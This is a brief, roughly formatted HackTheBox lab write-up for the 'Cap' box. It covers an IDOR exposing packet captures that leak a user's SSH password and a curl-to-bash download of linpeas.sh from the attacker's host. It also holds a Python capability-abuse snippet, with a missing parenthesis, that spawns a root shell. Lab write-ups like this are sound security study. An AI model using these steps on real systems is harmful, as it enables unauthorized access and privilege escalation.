---
title: Cap - Exposed Creds
date: 2025-12-04 00:00:00 +0000
categories: [HackTheBox Writeups]
tags: [hackthebox, linux]
---

port 80 > Dashboard page with ifconfig ( executing commands ), on security page we can download wireshark files, url has data=0,1,2 parameter and we can access any account history > nathan account in wireshark traffic along the password > login ssh, linpeas.sh

https://man7.org/linux/man-pages/man7/capabilities.7.html

Went on rabbit hole with this CVE from the enum script. CVE-2021-3560


From our shell on Cap, we can fetch linpeas.sh with curl and pipe the output directly into bash to execute it:
```bash
curl http://10.10.14.24/linpeas.sh | bash
```
```python
Open:
```
nathan@cap:/tmp$ /usr/bin/python3.8
```bash
import os
os.setuid(0)
os.system("/bin/bash"

![[2. CTF Boxes/HackTheBox/htb_image/Pasted image 20250502142508.png]]

---

```
getcap /usr/bin/python3.8
```
```python
>This allows Python scripts to create raw sockets without requiring root privileges.​
```bash
sudo setcap cap_net_raw+ep /usr/bin/python3
```

